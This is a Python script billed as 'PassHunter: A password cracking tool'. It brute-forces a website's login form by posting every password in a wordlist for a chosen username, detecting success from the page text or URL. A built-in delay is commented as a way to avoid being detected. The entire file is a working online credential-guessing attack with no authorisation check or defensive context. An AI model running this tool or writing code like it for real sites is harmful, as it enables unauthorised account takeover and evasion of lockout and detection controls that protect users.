import requests
import argparse
import time

def attempt_login(url, username, password):
    data = {'username': username, 'password': password}
    try:
        response = requests.post(url, data=data)
        if response.status_code == 200:
            # Customize this based on the website's specific successful login response.
            if "Welcome" in response.text or "dashboard" in response.url:
                return True
        return False
    except requests.RequestException as e:
        print(f"Error: {e}")
        return None

def main():
    parser = argparse.ArgumentParser(description='PassHunter: A password cracking tool.')
    parser.add_argument('url', help='The URL to target (e.g., https://example.com/login)')
    parser.add_argument('username', help='The username to use for login attempts')
    parser.add_argument('password_list', help='Path to the password list file')

    args = parser.parse_args()

    try:
        with open(args.password_list, 'r', encoding="ISO-8859-1") as f:
            passwords = f.read().splitlines()
    except IOError as e:
        print(f"Failed to open password list file: {e}")
        return

    for password in passwords:
        print(f'Trying password: {password}')
        success = attempt_login(args.url, args.username, password)

        if success:
            print(f"[+] Password found: {password}")
            break
        elif success is None:
            print("[-] Skipping due to a request error.")
        else:
            print("[-] Incorrect password.")

        # Wait a bit between attempts to avoid being detected
        time.sleep(0.5)

if __name__ == '__main__':
    main()

